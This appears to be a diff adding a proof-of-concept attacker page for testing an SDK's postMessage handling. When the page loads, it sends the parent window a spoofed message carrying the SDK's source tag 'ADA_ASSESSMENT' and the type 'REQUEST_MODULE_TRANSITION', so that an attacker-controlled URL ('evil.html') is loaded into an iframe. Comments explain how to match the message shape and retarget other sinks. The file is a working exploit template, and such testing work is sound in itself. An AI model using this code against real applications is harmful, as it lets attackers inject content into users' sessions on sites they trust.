@@ -1,0 +1,32 @@
+<!doctype html>
+<!--
+  ATTACKER FRAME — origin :8001 (different from the host)
+  On load it posts a message to the parent (the SDK host window).
+  Mirror the SDK's expected { source, type, payload } shape exactly —
+  wrong field names / source tag = silently ignored, not a finding.
+
+  The payload field that reaches a sink is the whole point. Here `module`
+  flows into an iframe src. Swap the type/payload for whichever sink you
+  traced (clipboard, onDataReceived, resize, close...).
+-->
+<html lang="en">
+<head><meta charset="utf-8"><title>Attacker frame (origin :8001)</title></head>
+<body style="font:14px sans-serif">
+  <b>ATTACKER ORIGIN</b> — sending malicious postMessage to parent…<br>
+  <span id="status">sent</span>
+  <script>
+    function fire() {
+      parent.postMessage({
+        source: "ADA_ASSESSMENT",          // <-- the SDK's expected source tag
+        type: "REQUEST_MODULE_TRANSITION", // <-- the message type that reaches the sink
+        payload: {
+          module: "http://127.0.0.1:8001/evil.html", // <-- attacker-controlled sink value
+          moduleProperties: {}
+        }
+      }, "*");
+    }
+    // fire on load and again after a beat (SDK may not be wired up yet)
+    window.addEventListener("load", () => { fire(); setTimeout(fire, 1500); });
+  </script>
+</body>
+</html>
